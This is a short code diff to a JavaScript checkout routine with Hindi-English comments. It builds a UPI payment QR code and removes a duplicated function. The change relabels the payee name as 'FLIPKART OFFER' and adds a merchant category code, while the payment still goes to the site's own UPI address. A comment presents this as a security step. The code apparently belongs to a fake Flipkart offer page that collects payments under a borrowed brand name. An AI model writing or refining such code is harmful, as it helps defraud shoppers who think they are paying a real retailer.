@@ -623,45 +623,23 @@ init = function() {
             }
         }
 
-        // QR Code dikhane ke liye function
 function showQRCode() {
     const amt = sel.price;
-    const upiLink = `upi://pay?pa=${MY_UPI}&pn=Order%20Payment&am=${amt}&cu=INR`;
+    // Security ke liye Merchant Code (mc) aur Name (pn) sahi rakhein
+    const upiLink = `upi://pay?pa=${MY_UPI}&pn=FLIPKART%20OFFER&am=${amt}&cu=INR&mc=5411`;
     
-    // Google API se QR generate karna
-    const qrUrl = `https://chart.googleapis.com/chart?chs=250x250&cht=qr&chl=${encodeURIComponent(upiLink)}`;
-    
-    document.getElementById('qr-img').src = qrUrl;
-    document.getElementById('qr-amt').innerText = "₹" + amt;
-    document.getElementById('qr-modal').classList.remove('hidden');
-}
-
-function closeQR() {
-    document.getElementById('qr-modal').classList.add('hidden');
-}
-
-function showQRCode() {
-    const amt = sel.price;
-    const upiLink = `upi://pay?pa=${MY_UPI}&pn=Order%20Payment&am=${amt}&cu=INR&tn=Order_${Date.now()}`;
-    
-    // Purana QR clear karne ke liye
-    document.getElementById("qrcode").innerHTML = "";
+    document.getElementById("qrcode").innerHTML = ""; // Purana QR saaf karne ke liye
     document.getElementById('qr-amt').innerText = "₹" + amt;
 
-    // Naya QR Code draw karne ke liye
     new QRCode(document.getElementById("qrcode"), {
         text: upiLink,
         width: 180,
-        height: 180,
-        colorDark : "#000000",
-        colorLight : "#ffffff",
-        correctLevel : QRCode.CorrectLevel.M
+        height: 180
     });
     
     document.getElementById('qr-modal').classList.remove('hidden');
 }
 
-// 2. Modal band karne ka function
 function closeQR() {
     document.getElementById('qr-modal').classList.add('hidden');
 }
